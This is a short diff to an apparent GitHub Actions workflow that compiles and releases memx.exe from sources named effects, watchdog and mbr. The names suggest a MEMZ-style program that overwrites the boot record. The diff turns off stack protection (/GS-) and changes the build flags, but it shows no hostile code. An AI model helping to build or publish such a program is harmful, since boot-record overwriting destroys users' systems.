@@ -21,9 +21,9 @@ jobs:
       - name: Build memx.exe
         shell: cmd
         run: |
-          cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp ^
+          cl /EHsc /std:c++17 /GS- /O1 /MT main.cpp effects.cpp watchdog.cpp mbr.c ^
           /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
-          /SUBSYSTEM:WINDOWS /OUT:memx.exe
+          /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup /OUT:memx.exe
 
       - name: Create Release
         uses: softprops/action-gh-release@v1
